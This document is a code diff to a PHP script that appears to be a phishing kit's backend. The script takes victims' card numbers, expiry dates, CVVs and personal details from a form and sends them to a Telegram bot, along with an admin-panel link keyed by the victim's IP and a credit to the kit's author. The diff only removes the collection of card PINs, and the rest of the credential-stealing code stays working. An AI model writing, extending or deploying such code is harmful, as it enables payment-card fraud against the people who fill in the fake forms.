@@ -179,9 +179,6 @@ function formatTelegramMessage($type, $data) {
             $message .= "💳 Card Number: " . htmlspecialchars($data['card_number'], ENT_QUOTES, 'UTF-8') . "\n";
             $message .= "📅 Expiry: " . htmlspecialchars($data['expiry'], ENT_QUOTES, 'UTF-8') . "\n";
             $message .= "🔒 CVV: " . htmlspecialchars($data['cvv'], ENT_QUOTES, 'UTF-8') . "\n";
-            if (isset($data['pin'])) {
-                $message .= "📌 PIN: " . htmlspecialchars($data['pin'], ENT_QUOTES, 'UTF-8') . "\n";
-            }
             break;
             
         case 'Personal':
@@ -293,26 +290,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         'fullname' => filter_var($_POST['fullname'], FILTER_SANITIZE_STRING),
                         'card_number' => preg_replace('/\D/', '', $_POST['card_number']),
                         'expiry' => filter_var($_POST['expiry'], FILTER_SANITIZE_STRING),
-                        'cvv' => filter_var($_POST['cvv'], FILTER_SANITIZE_STRING),
-                        'pin' => preg_replace('/\D/', '', $_POST['pin'])
+                        'cvv' => filter_var($_POST['cvv'], FILTER_SANITIZE_STRING)
                     );
                     $message = formatTelegramMessage('Card', $data);
                     
-                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
-                    $message .= "\n <b>Admin Panel:</b>\n";
-                    $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
-                    
-                    $telegram_response = $telegram->sendMessage($message);
-                    break;
-                    
-                case 'pin':
-                    $data = array(
-                        'pin' => $_POST['_pn']
-                    );
-                    $message = formatTelegramMessage('Card', $data);
-                    
-
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
@@ -407,9 +388,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 'expiry' => $_POST['expiry'],
                 'cvv' => $_POST['cvv']
             );
-            if (isset($_POST['pin'])) {
-                $data['pin'] = $_POST['pin'];
-            }
             $message = formatTelegramMessage('Card', $data);
             $telegram_response = $telegram->sendMessage($message);
             
